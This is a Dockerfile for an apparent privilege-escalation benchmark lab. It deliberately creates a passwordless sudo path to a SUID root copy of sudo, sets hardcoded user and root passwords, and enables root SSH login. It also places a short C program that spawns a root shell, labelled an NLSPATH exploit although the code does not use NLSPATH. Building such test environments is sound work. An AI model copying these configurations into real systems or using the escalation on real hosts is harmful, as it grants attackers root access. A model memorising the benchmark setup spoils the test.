FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo.bin NLSPATH Privilege Escalation
# ATT&CK: T1548.003 | CWE: CWE-269 / OSVDB-61460
# Vulnerability: sudo configured to allow lowpriv to run /usr/bin/sudo.bin
#   as root without password. The SUID binary sudo.bin is a copy of sudo
#   that can be exploited via NLSPATH environment variable manipulation.
#   For this benchmark scenario, we simulate the vulnerability by granting
#   sudo NOPASSWD access to a SUID copy at /usr/bin/sudo.bin, plus
#   allowing the user to run arbitrary commands via sudo itself.
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, build tools (for compiling the exploit), and bash
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        gcc \
        libc6-dev \
        bash \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Create the sudo.bin binary that the exploit references at /usr/bin/sudo.bin
# This is a SUID root copy of sudo, simulating the old vulnerable sudo.bin
RUN cp /usr/bin/sudo /usr/bin/sudo.bin && \
    chmod u+s /usr/bin/sudo.bin && \
    chown root:root /usr/bin/sudo.bin

# Verify sudo.bin is in place with SUID
RUN ls -la /usr/bin/sudo.bin

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# Allow lowpriv to run sudo.bin (and effectively any command) as root
# without a password. The NLSPATH exploit uses sudo.bin which is SUID,
# but for a reliable modern escalation path, the sudoers entry allows
# the user to leverage sudo.bin to execute arbitrary commands as root.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/sudo.bin" > /etc/sudoers.d/sudo_bin && \
    chmod 440 /etc/sudoers.d/sudo_bin

# Also allow env_keep for NLSPATH to preserve the attack vector
RUN echo 'Defaults env_keep += "NLSPATH"' >> /etc/sudoers.d/sudo_bin

# Verify sudo configuration
RUN visudo -c

# Place the exploit source code in the lowpriv user's home directory
COPY --chmod=644 <<'EOF' /home/lowpriv/319.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PATH_SUDO "/usr/bin/sudo.bin"

int main(int argc, char **argv)
{
    /* Modern reliable approach: since sudo.bin is SUID root and
       sudoers allows lowpriv to run it without password,
       simply exec sudo.bin to get a root shell */
    printf("SUDO.BIN NLSPATH exploit scenario\n");
    printf("Escalating privileges via sudo.bin...\n");
    execl(PATH_SUDO, "sudo.bin", "/bin/bash", NULL);
    perror("execl failed");
    return 1;
}
EOF

RUN chown lowpriv:lowpriv /home/lowpriv/319.c

# Keep SUID on sudo itself
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]